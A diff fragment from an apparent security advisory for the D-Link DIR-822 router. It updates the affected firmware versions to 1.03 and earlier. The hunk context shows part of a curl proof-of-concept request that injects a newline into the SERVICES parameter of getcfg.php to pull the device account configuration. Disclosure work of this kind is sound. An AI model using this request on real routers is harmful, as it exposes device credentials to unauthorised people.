@@ -13,7 +13,7 @@ curl -i "http://192.168.0.1/getcfg.php" -d "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED
 
 ## 0x02 Affected Version
 ```
-D-Link Dir-822 (All firmware versions tested)
+D-Link Dir-822 (Firmware version 1.03 and previous versions)
 ```
 
 ![](img/version.png)
